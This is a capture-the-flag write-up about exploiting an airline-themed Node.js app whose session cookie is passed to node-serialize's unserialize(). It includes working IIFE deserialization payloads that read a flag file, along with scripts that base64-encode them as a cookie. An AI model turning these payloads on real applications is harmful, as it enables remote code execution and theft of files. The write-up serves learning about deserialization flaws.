# Hack Holidays Airlines
## The App
The app represents an airline website. You can

- Sign up with a username, password and airline ticket number
- Then sign in with the username and password
- After that, the flight info will be displayed as a static image (it does not seem to contain any usefull information though at first glance)

## Code Review
After downloading the offered code, I looked into the folder with the app. Some JavaScript files, our (fake) Flag (hurray! No guessing where I neet to search for) and the `package.json`. Ok, so I ran `npm install` aaaannnnd:

```bash
[~/ctf/challenge]$ npm install             

added 258 packages, and audited 259 packages in 17s

20 packages are looking for funding
  run `npm fund` for details

1 critical severity vulnerability

Some issues need review, and may require choosing
a different dependency.

Run `npm audit` for details.

[~/ctf/challenge]$ npm audit  
# npm audit report

node-serialize  *
Severity: critical
Code Execution through IIFE in node-serialize - https://github.com/advisories/GHSA-q4v7-4rhw-9hqm
No fix available
node_modules/node-serialize

1 critical severity vulnerability

Some issues need review, and may require choosing
a different dependency.
```

Wow, interesting! "Code Execution through IIFE in node-serialize", thats the description from the GitHub [security advisory](https://github.com/advisories/GHSA-q4v7-4rhw-9hqm). Damn, 9.8/10, this must be something. But what the heck is "IIFE"? Okay Google ... or just opening the directly linked Wikipedia article in the advisory saves few clicks.

- https://developer.mozilla.org/en-US/docs/Glossary/IIFE
- https://en.wikipedia.org/wiki/Immediately_invoked_function_expression

After reading the advisory, it is clear thet `unserialize()` is the dangerous function here. Okay, let's remember that for later!

Were were we? Ah yes, review of the code. Ooops, just forgot about that and thought about this IIFE thing. But I have to calm down, you cant run before learning to crawl! So lets open it in VS Code and take a look. **No wait, a better idea!** Let's start the app first and see it in action. So lets try `npm run start` and ... rjagsdfgkafg!!!

```
> web_she_realized_the_problem@1.0.0 start
> node .

node:events:505
      throw er; // Unhandled 'error' event
      ^

Error: listen EACCES: permission denied 0.0.0.0:80
    at Server.setupListenHandle [as _listen2] (node:net:1355:21)
    at listenInCluster (node:net:1420:12)
    at Server.listen (node:net:1508:7)
    at Function.listen (ctf/challenge/node_modules/express/lib/application.js:635:24)
    at Object.<anonymous> (ctf/challenge/index.js:39:5)
    at Module._compile (node:internal/modules/cjs/loader:1105:14)
    at Object.Module._extensions..js (node:internal/modules/cjs/loader:1159:10)
    at Module.load (node:internal/modules/cjs/loader:981:32)
    at Function.Module._load (node:internal/modules/cjs/loader:822:12)
    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:77:12)
Emitted 'error' event on Server instance at:
    at emitErrorNT (node:net:1399:8)
    at processTicksAndRejections (node:internal/process/task_queues:83:21) {
  code: 'EACCES',
  errno: -13,
  syscall: 'listen',
  address: '0.0.0.0',
  port: 80
}
```

Yikes, it tried to open a priviliged port. Okay then let's try `npm run dev` (oh BTW, you can find scripts executed by the `npm run` command in the `scripts` section of the `package.json`). Ahh, failed again. So I looked into our `index.js` and spotted `const port = process.env.PORT || 80;`. Ah, makes sense, so the command would be `PORT=8080 npm run ...`. Yeahhhh, worked. Oh, and a new file named `storage.db` appeared in our directory. Okay, lets take a look at the app.

![[app1.png]]
Nothing special. So lets go on. Interested in what the database looks like? Me too. So let's see what database engine seemed to be used (guess it was SQLite), open `package.json` again and ... yes it is SQLite as the dependecies say. Ok let's open the file in "DB Browser for SQLite":

![[db_user_table.png]]

Ok, nothing special at first. Although the `id` is weird. Just a ... double as a varchar?? Yeah, let's don't ask why exactly and just continue by reviewing the source now.

Firs't, let's open the `routes folder` which contains:

- index.js
- login.js
- logout.js
- signup.js

Pretty clear what they do, no spaghetti code, yay! So let's open index and ...

```javascript
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');

module.exports = (app, globalConfig) => {
	app.use(cookieParser())

	app.get('/', function(req, res) {
		if (req.cookies.session) {
			authorized = true;

			var cookieValue = new Buffer(escape((req.cookies.session)), 'base64').toString();
			var userInfo = serialize.unserialize(cookieValue);

			if (userInfo.username) {
				res.render('index', { title: 'Home', username: userInfo.username , authorized: authorized});
			}
		} else {
			authorized = false;
			res.render('index', { title: 'Home', authorized: authorized });
		}
	});
};
```

Well, this was not what I expected. **RED ALERT!** `unserialize()`. So, the cookie is a serialized JS object which contains the user info. So if we control the cookie => BOOM! Remote Code execution. So let's see if we can execute a malicious payload ...

## Tried soloutions
First, let's try a basic Unserialize without Cookies and all that stuff. Just an additional javascript file with our tests:

```javascript
let serialize = require("node-serialize");

let serializedPayload = serialize.serialize({
	username: (function () {
		console.error("a malicious payload was executed! H4CK3D!!!");
	})()
});

console.log(serializedPayload);

let unserializedPayload = serialize.unserialize(serializedPayload);
```

And yeah, this works without a problem. So I can craft the malicious payload (at least I thought so).

The payload needs to read our flag file and return the result as the username, so that we can see it in our website. Remember, it's shown there already as "Welcome xxx".

```javascript
let serialize = require("node-serialize");

let payload = {
	username: (() => {
		let fs = require("fs");
		let flag = fs.readFileSync("./flag").toString("utf-8");
		console.log(flag);
		
		return flag;

	})()
};

let serializedPayload = serialize.serialize(payload);
console.log(serializedPayload);
let unserializedPayload = serialize.unserialize(serializedPayload);
```

Aaaand ... oh, I made a stupid mistake!

### Problems

#### Payload was executed BEFORE serialization
Yeah, as the heading says, the payload was not serialized there and only executed before serializing. I mean makes sense because the function is executed. So I experimented a bit and looked up documentation.

https://github.com/luin/serialize

Oh, this is how functions can be executed. The function is encoded into the string and then gets executed.

### Solution

```javascript
let serialize = require("node-serialize");

let payload = `{
	"username": "_$$ND_FUNC$$_function (){let fs = require('fs');let flag = fs.readFileSync('./flag').toString('utf-8');console.log('Flag is: ' + flag);return flag;}()"
}`;

let unserializedPayload = serialize.unserialize(payload);
console.log(unserializedPayload.username);

console.log("Your payload cookie will be: " + new Buffer(payload, "utf-8").toString("base64"));
```

We can set the resulting payload shown in the console as our `session` Cookie:

![[exploit_dev_environment.png]]

## Attack real target
Attacking the sandbox gave me the flag without any problems

## Better solution (after solving)
```javascript
let serialize = require("node-serialize");

let payload = {
    "username": function () {
        let fs = require('fs');
        let flag = fs.readFileSync('./flag').toString('utf-8');
        console.log('Flag is: ' + flag);

        return flag;
    }
};
let serializedPayload = serialize.serialize(payload);
serializedPayload = serializedPayload.replace('}"}', '}()"}');
console.log("Serialized payload: " + serializedPayload + "\n");
let unserializedPayload = serialize.unserialize(serializedPayload);
console.log(unserializedPayload.username);

console.log("Your payload cookie will be: " + new Buffer.from(serializedPayload, "utf-8").toString("base64"));
```

Can serialize the payload istself without hand crafting.